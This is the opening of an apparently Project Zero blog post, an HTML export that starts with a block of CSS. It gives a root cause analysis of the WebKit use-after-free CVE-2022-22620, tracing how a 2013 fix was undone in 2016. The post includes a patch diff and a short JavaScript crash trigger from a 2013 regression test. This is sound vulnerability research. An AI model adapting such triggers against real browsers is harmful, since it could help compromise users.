"}.lst-kix_rpn0sahs9m0k-3>li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-3}.lst-kix_omx22nj2js1z-3>li:before{content:"" counter(lst-ctn-kix_omx22nj2js1z-3,decimal) ". "}ol.lst-kix_omx22nj2js1z-3.start{counter-reset:lst-ctn-kix_omx22nj2js1z-3 0}ol.lst-kix_rpn0sahs9m0k-7{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-8{list-style-type:none}.lst-kix_omx22nj2js1z-5>li:before{content:"" counter(lst-ctn-kix_omx22nj2js1z-5,lower-roman) ". "}.lst-kix_ziaggw1wsf95-0>li:before{content:"\0025cf  "}.lst-kix_rpn0sahs9m0k-0>li:before{content:"" counter(lst-ctn-kix_rpn0sahs9m0k-0,decimal) ") "}.lst-kix_omx22nj2js1z-4>li:before{content:"" counter(lst-ctn-kix_omx22nj2js1z-4,lower-latin) ". "}.lst-kix_omx22nj2js1z-7>li{counter-increment:lst-ctn-kix_omx22nj2js1z-7}.lst-kix_omx22nj2js1z-7>li:before{content:"" counter(lst-ctn-kix_omx22nj2js1z-7,lower-latin) ". "}ol.lst-kix_rpn0sahs9m0k-1{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-2{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-0{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-5{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-6{list-style-type:none}.lst-kix_omx22nj2js1z-6>li:before{content:"" counter(lst-ctn-kix_omx22nj2js1z-6,decimal) ". "}ol.lst-kix_rpn0sahs9m0k-3{list-style-type:none}ol.lst-kix_rpn0sahs9m0k-6.start{counter-reset:lst-ctn-kix_rpn0sahs9m0k-6 0}.lst-kix_omx22nj2js1z-1>li{counter-increment:lst-ctn-kix_omx22nj2js1z-1}ol.lst-kix_rpn0sahs9m0k-4{list-style-type:none}.lst-kix_ziaggw1wsf95-6>li:before{content:"\0025cf  "}ol.lst-kix_omx22nj2js1z-0{list-style-type:none}.lst-kix_ziaggw1wsf95-5>li:before{content:"\0025a0  "}.lst-kix_ziaggw1wsf95-7>li:before{content:"\0025cb  "}.lst-kix_ziaggw1wsf95-4>li:before{content:"\0025cb  "}.lst-kix_ziaggw1wsf95-8>li:before{content:"\0025a0  "}.lst-kix_omx22nj2js1z-8>li:before{content:"" counter(lst-ctn-kix_omx22nj2js1z-8,lower-roman) ". "}ol.lst-kix_omx22nj2js1z-6{list-style-type:none}.lst-kix_ziaggw1wsf95-2>li:before{content:"\0025a0  "}ol.lst-kix_omx22nj2js1z-5{list-style-type:none}ol.lst-kix_omx22nj2js1z-4.start{counter-reset:lst-ctn-kix_omx22nj2js1z-4 0}ol.lst-kix_omx22nj2js1z-8{list-style-type:none}.lst-kix_ziaggw1wsf95-1>li:before{content:"\0025cb  "}.lst-kix_ziaggw1wsf95-3>li:before{content:"\0025cf  "}ol.lst-kix_omx22nj2js1z-7{list-style-type:none}ol.lst-kix_omx22nj2js1z-2{list-style-type:none}ol.lst-kix_omx22nj2js1z-1{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_omx22nj2js1z-4{list-style-type:none}ol.lst-kix_omx22nj2js1z-3{list-style-type:none}.lst-kix_rpn0sahs9m0k-0>li{counter-increment:lst-ctn-kix_rpn0sahs9m0k-0}.lst-kix_rpn0sahs9m0k-7>li:before{content:"" counter(lst-ctn-kix_rpn0sahs9m0k-7,lower-latin) ". "}ol{margin:0;padding:0}table td,table th{padding:0}.ZslSztaQWN-c45{border-right-style:solid;padding-top:1.7pt;border-top-width:0pt;border-right-width:0pt;padding-left:8.5pt;padding-bottom:4.2pt;line-height:1.5;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;text-align:left;padding-right:0pt}.ZslSztaQWN-c9{border-right-style:solid;padding:0pt 4pt 0pt 4pt;border-bottom-color:#999988;border-top-width:1pt;border-right-width:1pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#00aa00;border-left-width:1pt;border-top-style:solid;background-color:#eeeedd;border-left-style:solid;border-bottom-width:1pt;width:30pt;border-top-color:#999988;border-bottom-style:solid}.ZslSztaQWN-c49{border-right-style:solid;padding:1pt 2pt 1pt 2pt;border-bottom-color:#00aa00;border-top-width:0pt;border-right-width:1pt;border-left-color:#00aa00;vertical-align:top;border-right-color:#00aa00;border-left-width:1pt;border-top-style:solid;background-color:#ddffdd;border-left-style:solid;border-bottom-width:1pt;width:421.5pt;border-top-color:#cc0000;border-bottom-style:solid}.ZslSztaQWN-c38{border-right-style:solid;padding:0pt 2pt 0pt 2pt;border-bottom-color:#999988;border-top-width:1pt;border-right-width:1pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#d7d7d7;border-left-width:1pt;border-top-style:solid;background-color:#eeeeee;border-left-style:solid;border-bottom-width:1pt;width:30pt;border-top-color:#d7d7d7;border-bottom-style:solid}.ZslSztaQWN-c30{border-right-style:solid;padding:0pt 2pt 0pt 2pt;border-bottom-color:#999988;border-top-width:1pt;border-right-width:1pt;border-left-color:#999999;vertical-align:top;border-right-color:#d7d7d7;border-left-width:0pt;border-top-style:solid;background-color:#eeeeee;border-left-style:solid;border-bottom-width:1pt;width:27pt;border-top-color:#d7d7d7;border-bottom-style:solid}.ZslSztaQWN-c44{border-right-style:solid;padding:1pt 2pt 1pt 2pt;border-bottom-color:#cc0000;border-top-width:0pt;border-right-width:0pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#ffffff;border-left-style:solid;border-bottom-width:1pt;width:421.5pt;border-top-color:#000000;border-bottom-style:solid}.ZslSztaQWN-c36{border-right-style:solid;padding:0pt 4pt 0pt 4pt;border-bottom-color:#999988;border-top-width:1pt;border-right-width:1pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#cc0000;border-left-width:1pt;border-top-style:solid;background-color:#eeeedd;border-left-style:solid;border-bottom-width:1pt;width:30pt;border-top-color:#999988;border-bottom-style:solid}.ZslSztaQWN-c51{border-right-style:solid;padding:1pt 2pt 1pt 2pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:0pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#ffffff;border-left-style:solid;border-bottom-width:0pt;width:421.5pt;border-top-color:#d7d7d7;border-bottom-style:solid}.ZslSztaQWN-c13{border-right-style:solid;padding:0pt 4pt 0pt 4pt;border-bottom-color:#999988;border-top-width:1pt;border-right-width:1pt;border-left-color:#888866;vertical-align:top;border-right-color:#d7d7d7;border-left-width:0pt;border-top-style:solid;background-color:#eeeedd;border-left-style:solid;border-bottom-width:1pt;width:27pt;border-top-color:#999988;border-bottom-style:solid}.ZslSztaQWN-c48{border-right-style:solid;padding:0pt 4pt 0pt 4pt;border-bottom-color:#999988;border-top-width:1pt;border-right-width:1pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#d7d7d7;border-left-width:1pt;border-top-style:solid;background-color:#eeeedd;border-left-style:solid;border-bottom-width:1pt;width:30pt;border-top-color:#999988;border-bottom-style:solid}.ZslSztaQWN-c10{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#e0e0e0;border-top-width:1pt;border-right-width:1pt;border-left-color:#e0e0e0;vertical-align:top;border-right-color:#e0e0e0;border-left-width:1pt;border-top-style:solid;background-color:#fafafa;border-left-style:solid;border-bottom-width:1pt;width:468pt;border-top-color:#e0e0e0;border-bottom-style:solid}.ZslSztaQWN-c50{border-right-style:solid;padding:1pt 2pt 1pt 2pt;border-bottom-color:#d7d7d7;border-top-width:1pt;border-right-width:1pt;border-left-color:#d7d7d7;vertical-align:top;border-right-color:#d7d7d7;border-left-width:1pt;border-top-style:solid;background-color:#f7f7f7;border-left-style:solid;border-bottom-width:1pt;width:421.5pt;border-top-color:#d7d7d7;border-bottom-style:solid}.ZslSztaQWN-c34{border-right-style:solid;padding:1pt 2pt 1pt 2pt;border-bottom-color:#cc0000;border-top-width:1pt;border-right-width:1pt;border-left-color:#cc0000;vertical-align:top;border-right-color:#cc0000;border-left-width:1pt;border-top-style:solid;background-color:#ffdddd;border-left-style:solid;border-bottom-width:0pt;width:421.5pt;border-top-color:#cc0000;border-bottom-style:solid}.ZslSztaQWN-c18{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center;height:11pt}.ZslSztaQWN-c11{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left;height:11pt}.ZslSztaQWN-c5{color:#000000;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:11pt;font-family:"Arial";font-style:normal}.ZslSztaQWN-c31{padding-top:20pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;text-align:left}.ZslSztaQWN-c52{padding-top:6pt;padding-bottom:0pt;line-height:1.45;text-align:left}.ZslSztaQWN-c46{font-size:10pt;font-family:Consolas,"Courier New";color:#9c27b0;font-weight:400}.ZslSztaQWN-c24{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:right}.ZslSztaQWN-c8{color:#000000;font-weight:400;font-size:20pt;font-family:"Arial"}.ZslSztaQWN-c25{color:#24292f;font-weight:400;font-size:10pt;font-family:Consolas,"Courier New"}.ZslSztaQWN-c12{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.ZslSztaQWN-c17{font-size:10pt;font-family:Consolas,"Courier New";color:#0f9d58;font-weight:400}.ZslSztaQWN-c0{font-size:10pt;font-family:Consolas,"Courier New";color:#000000;font-weight:400}.ZslSztaQWN-c32{font-size:10pt;font-family:Consolas,"Courier New";color:#455a64;font-weight:400}.ZslSztaQWN-c21{color:#000000;font-weight:400;font-size:7pt;font-family:"Verdana"}.ZslSztaQWN-c1{font-size:10pt;font-family:Consolas,"Courier New";color:#3367d6;font-weight:400}.ZslSztaQWN-c33{font-size:7pt;font-family:"Verdana";color:#888866;font-weight:400}.ZslSztaQWN-c16{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.ZslSztaQWN-c3{font-size:10pt;font-family:Consolas,"Courier New";color:#c53929;font-weight:400}.ZslSztaQWN-c27{border-spacing:0;border-collapse:collapse;margin-right:auto}.ZslSztaQWN-c42{color:#333333;font-weight:700;font-size:11pt;font-family:"Arial"}.ZslSztaQWN-c2{font-size:10pt;font-family:Consolas,"Courier New";color:#616161;font-weight:400}.ZslSztaQWN-c28{font-size:7pt;font-family:"Courier New";font-weight:400}.ZslSztaQWN-c43{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.ZslSztaQWN-c4{font-family:Consolas,"Courier New";color:#0d904f;font-weight:400}.ZslSztaQWN-c6{text-decoration:none;vertical-align:baseline;font-style:normal}.ZslSztaQWN-c19{orphans:2;widows:2}.ZslSztaQWN-c29{color:#1155cc;font-weight:700}.ZslSztaQWN-c23{margin-left:36pt;padding-left:0pt}.ZslSztaQWN-c47{font-weight:400;font-family:Consolas,"Courier New"}.ZslSztaQWN-c14{color:inherit;text-decoration:inherit}.ZslSztaQWN-c22{padding:0;margin:0}.ZslSztaQWN-c26{margin-left:72pt;padding-left:0pt}.ZslSztaQWN-c20{height:11pt}.ZslSztaQWN-c15{height:0pt}.ZslSztaQWN-c37{background-color:#99ee99}.ZslSztaQWN-c40{height:11.2pt}.ZslSztaQWN-c35{height:12pt}.ZslSztaQWN-c7{height:12.8pt}.ZslSztaQWN-c39{background-color:#ee9999}.ZslSztaQWN-c41{margin-left:36pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="ZslSztaQWN-c43">
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c5">Posted by Maddie Stone, Google Project Zero</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>Whenever there&rsquo;s a new in-the-wild 0-day disclosed, I&rsquo;m very interested in understanding the root cause of the bug. This allows us to then understand if it was fully fixed, look for variants, and brainstorm new mitigations. This blog is the story of a &ldquo;zombie&rdquo; Safari 0-day and how it came back from the dead to be disclosed as exploited in-the-wild in 2022. CVE-2022-22620 was initially fixed in 2013, reintroduced in 2016, and then disclosed as exploited in-the-wild in 2022. If you&rsquo;re interested in the full root cause analysis for CVE-2022-22620, we&rsquo;ve published it </span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://googleprojectzero.github.io/0days-in-the-wild//0day-RCAs/2022/CVE-2022-22620.html">here</a></span><span class="ZslSztaQWN-c5">.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>In the </span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://googleprojectzero.blogspot.com/2021/02/deja-vu-lnerability.html">2020 Year in Review of 0-days exploited in the wild</a></span><span class="ZslSztaQWN-c5">, I wrote how 25% of all 0-days detected and disclosed as exploited in-the-wild in 2020 were variants of previously disclosed vulnerabilities. Almost halfway through 2022 and it seems like we&rsquo;re seeing a similar trend. Attackers don&rsquo;t need novel bugs to effectively exploit users with 0-days, but instead can use vulnerabilities closely related to previously disclosed ones. This blog focuses on just one example from this year because it&rsquo;s a little bit different from other variants that we&rsquo;ve discussed before. Most variants we&rsquo;ve discussed previously exist due to incomplete patching. But in this case, the variant was completely patched when the vulnerability was initially reported in 2013. However, the variant was reintroduced 3 years later during large refactoring efforts. The vulnerability then continued to exist for 5 years until it was fixed as an in-the-wild 0-day in January 2022.</span></p><h1 class="ZslSztaQWN-c31 ZslSztaQWN-c19" id="h.73vyhrucsc6"><span class="ZslSztaQWN-c8 ZslSztaQWN-c6">Getting Started</span></h1>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>In the case of CVE-2022-22620 I had two pieces of information to help me figure out the vulnerability: </span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/commit/486816dc355c19f1de1b8056f85d0bbf7084dd6e">the patch</a></span><span>&nbsp;(thanks to Apple for sharing with me!) and </span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://support.apple.com/en-us/HT213093">the description from the security bulletin</a></span><span>&nbsp;stating that the vulnerability is a use-after-free. The primary change in the patch was to change the type of the second argument (</span><span class="ZslSztaQWN-c4">stateObject</span><span>) to the function </span><span class="ZslSztaQWN-c4">FrameLoader::loadInSameDocument</span><span>&nbsp;from a raw pointer, </span><span class="ZslSztaQWN-c4">SerializedScriptValue*</span><span>&nbsp;to a reference-counted pointer, </span><span class="ZslSztaQWN-c4">RefPtr&lt;SerializedScriptValue&gt;</span><span class="ZslSztaQWN-c5">.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c19 ZslSztaQWN-c45"><span class="ZslSztaQWN-c29"><a class="ZslSztaQWN-c141" href="https://trac.webkit.org/changeset/288539/webkit/trunk/Source/WebCore/loader/FrameLoader.cpp">trunk/Source/WebCore/loader/FrameLoader.cpp</a></span><span class="ZslSztaQWN-c6 ZslSztaQWN-c42">&nbsp;</span></p><a id="t.d2b748d06cece430655335607ebc8e7dbe422f78"></a><a id="t.0"></a><table class="ZslSztaQWN-c27"><tr class="ZslSztaQWN-c7"><td class="ZslSztaQWN-c30" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c18"><span class="ZslSztaQWN-c21 ZslSztaQWN-c6"></span></p></td><td class="ZslSztaQWN-c38" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c18"><span class="ZslSztaQWN-c21 ZslSztaQWN-c6"></span></p></td><td class="ZslSztaQWN-c50" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c21 ZslSztaQWN-c6"></span></p></td></tr><tr class="ZslSztaQWN-c40"><td class="ZslSztaQWN-c13" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c24 ZslSztaQWN-c19"><span class="ZslSztaQWN-c33">1094</span></p></td><td class="ZslSztaQWN-c48" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c24 ZslSztaQWN-c19"><span class="ZslSztaQWN-c33">1094</span></p></td><td class="ZslSztaQWN-c51" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c28">// This does the same kind of work that didOpenURL does, except it relies on the fact</span></p></td></tr><tr class="ZslSztaQWN-c40"><td class="ZslSztaQWN-c13" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c24 ZslSztaQWN-c19"><span class="ZslSztaQWN-c33">1095</span></p></td><td class="ZslSztaQWN-c48" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c19 ZslSztaQWN-c24"><span class="ZslSztaQWN-c33">1095</span></p></td><td class="ZslSztaQWN-c44" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c28">// that a higher level already checked that the URLs match and the scrolling is the right thing to do.</span></p></td></tr><tr class="ZslSztaQWN-c35"><td class="ZslSztaQWN-c13" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c24 ZslSztaQWN-c19"><span class="ZslSztaQWN-c33">1096</span></p></td><td class="ZslSztaQWN-c36" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c24 ZslSztaQWN-c19"><span class="ZslSztaQWN-c33">&nbsp;</span></p></td><td class="ZslSztaQWN-c34" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c28">void FrameLoader::loadInSameDocument(</span><span class="ZslSztaQWN-c28 ZslSztaQWN-c39">const URL&amp; url, SerializedScriptValue*</span><span class="ZslSztaQWN-c28">&nbsp;stateObject, bool isNewNavigation)</span></p></td></tr><tr class="ZslSztaQWN-c35"><td class="ZslSztaQWN-c13" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c24 ZslSztaQWN-c19"><span class="ZslSztaQWN-c33">&nbsp;</span></p></td><td class="ZslSztaQWN-c9" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c24 ZslSztaQWN-c19"><span class="ZslSztaQWN-c33">1096</span></p></td><td class="ZslSztaQWN-c49" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c28">void FrameLoader::loadInSameDocument(</span><span class="ZslSztaQWN-c28 ZslSztaQWN-c37">URL url, RefPtr&lt;SerializedScriptValue&gt;</span><span class="ZslSztaQWN-c28">&nbsp;stateObject, bool isNewNavigation)</span></p></td></tr></table>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c5">Whenever I&rsquo;m doing a root cause analysis on a browser in-the-wild 0-day, along with studying the code, I also usually search through commit history and bug trackers to see if I can find anything related. I do this to try and understand when the bug was introduced, but also to try and save time. (There&rsquo;s a lot of 0-days to be studied! &#x1f600;)</span></p><h1 class="ZslSztaQWN-c31 ZslSztaQWN-c19" id="h.biu13uvstqei"><span class="ZslSztaQWN-c8 ZslSztaQWN-c6">The Previous Life</span></h1>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>In the case of CVE-2022-22620, I was scrolling through the </span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://git-scm.com/docs/git-blame">git </a></span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://git-scm.com/docs/git-blame">blame</a></span><span>&nbsp;view of </span><span class="ZslSztaQWN-c4">FrameLoader.cpp</span><span>. Specifically I was looking at the </span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/blame/7b23cae2a1b1ffd026288f15261f8ba272c3b24b/Source/WebCore/loader/FrameLoader.cpp#L1096">definition of </a></span><span class="ZslSztaQWN-c16 ZslSztaQWN-c47"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/blame/7b23cae2a1b1ffd026288f15261f8ba272c3b24b/Source/WebCore/loader/FrameLoader.cpp#L1096">loadInSameDocument</a></span><span>. When looking at the git blame for this line prior to our patch, it&rsquo;s a </span><span>very </span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/commit/aa31b6b4d09b09acdf1cec11f2f7f35bd362dd0e">interesting commit</a></span><span>. The commit was actually changing the </span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;argument from a reference-counted pointer, </span><span class="ZslSztaQWN-c4">PassRefPtr&lt;SerializedScriptValue&gt;</span><span>, to a raw pointer, </span><span class="ZslSztaQWN-c4">SerializedScriptValue</span><span class="ZslSztaQWN-c4">*</span><span>. This change from December 2016 introduced CVE-2022-22620. The </span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/commit/aa31b6b4d09b09acdf1cec11f2f7f35bd362dd0e#diff-9fb71b6fa7156160059b0216d05933e621d422df2b20f72ad7399eb946b8ba04">Changelog even states</a></span><span class="ZslSztaQWN-c5">:</span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span><br></span><span class="ZslSztaQWN-c25 ZslSztaQWN-c6">(WebCore::FrameLoader::loadInSameDocument): Take a raw pointer for the</span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c25 ZslSztaQWN-c6">serialized script value state object. No one was passing ownership.</span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c25 ZslSztaQWN-c6">But pass it along to statePopped as a Ref since we need to pass ownership</span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c25 ZslSztaQWN-c6">of the null value, at least for now.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>Now I was intrigued and wanted to track down the previous commit that had changed the </span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;argument to </span><span class="ZslSztaQWN-c4">PassRefPtr&lt;SerializedScriptValue&gt;</span><span>. I was in luck and only had to go </span><span>back in the history two more steps</span><span>. There was a </span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://github.com/WebKit/WebKit/commit/4b3be1d3a8d22cb2b2f5ddb8299f7cd25a21cebf">commit from 2013</a></span><span>&nbsp;that changed the </span><span class="ZslSztaQWN-c4">stateObject</span><span>&nbsp;argument from the raw pointer, </span><span class="ZslSztaQWN-c4">SerializedScriptValue*</span><span>, to a reference-counted pointer, </span><span class="ZslSztaQWN-c4">PassRefPtr&lt;SerializedScriptValue&gt;</span><span class="ZslSztaQWN-c5">. This commit from February 2013 was doing the same thing that our commit in 2022 was doing. The commit was titled &ldquo;Use-after-free in SerializedScriptValue::deserialize&rdquo; and included a good description of how that use-after-free worked.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c5">The commit also included a test:</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c6 ZslSztaQWN-c25">Added a test that demonstrated a crash due to use-after-free</span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c25 ZslSztaQWN-c6">of SerializedScriptValue.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c25 ZslSztaQWN-c6"></span></p>
 <p class="ZslSztaQWN-c19 ZslSztaQWN-c52"><span class="ZslSztaQWN-c25 ZslSztaQWN-c6">Test: fast/history/replacestate-nocrash.html</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c5">The trigger from this test is:</span></p><a id="t.bea0338a691e658fe5342eccc78ecfb67c0fd560"></a><a id="t.1"></a><table class="ZslSztaQWN-c27"><tr class="ZslSztaQWN-c15"><td class="ZslSztaQWN-c10" colspan="1" rowspan="1">
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c1">Object</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">prototype</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">__defineSetter__</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c17">&quot;foo&quot;</span><span class="ZslSztaQWN-c2">,</span><span class="ZslSztaQWN-c46">function</span><span class="ZslSztaQWN-c2">(){</span><span class="ZslSztaQWN-c0">history</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">replaceState</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c17">&quot;&quot;</span><span class="ZslSztaQWN-c2">,</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c17">&quot;&quot;</span><span class="ZslSztaQWN-c2">)});</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">history</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">replaceState</span><span class="ZslSztaQWN-c2">({</span><span class="ZslSztaQWN-c0">foo</span><span class="ZslSztaQWN-c2">:</span><span class="ZslSztaQWN-c3">1</span><span class="ZslSztaQWN-c2">,</span><span class="ZslSztaQWN-c0">zzz</span><span class="ZslSztaQWN-c2">:</span><span class="ZslSztaQWN-c17">&quot;a&quot;</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">repeat</span><span class="ZslSztaQWN-c2">(</span><span class="ZslSztaQWN-c3">1</span><span class="ZslSztaQWN-c2">&lt;&lt;</span><span class="ZslSztaQWN-c3">22</span><span class="ZslSztaQWN-c2">)},</span><span class="ZslSztaQWN-c0">&nbsp;</span><span class="ZslSztaQWN-c17">&quot;&quot;</span><span class="ZslSztaQWN-c2">);</span></p>
 <p class="ZslSztaQWN-c12"><span class="ZslSztaQWN-c0">history</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">state</span><span class="ZslSztaQWN-c2">.</span><span class="ZslSztaQWN-c0">length</span><span class="ZslSztaQWN-c2">;</span></p></td></tr></table>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span class="ZslSztaQWN-c5">My hope was that the test would crash the vulnerable version of WebKit and I&rsquo;d be done with my root cause analysis and could move on to the next bug. Unfortunately, it didn&rsquo;t crash.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
 <p class="ZslSztaQWN-c12 ZslSztaQWN-c19"><span>The commit description included the comment to check out a Chromium bug. (During this time Chromium still used the WebKit rendering engine. Chromium forked</span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://blog.chromium.org/2013/04/blink-rendering-engine-for-chromium.html">&nbsp;the Blink rendering engine in April 2013</a></span><span>.) </span><span>I saw that my now Project Zero teammate, Sergei Glazunov, originally reported the </span><span class="ZslSztaQWN-c16"><a class="ZslSztaQWN-c141" href="https://bugs.chromium.org/p/chromium/issues/detail?id=171839">Chromium bug</a></span><span>&nbsp;</span><span>back in 2013</span><span>, so I asked him for the details.</span></p>
 <p class="ZslSztaQWN-c11"><span class="ZslSztaQWN-c5"></span></p>
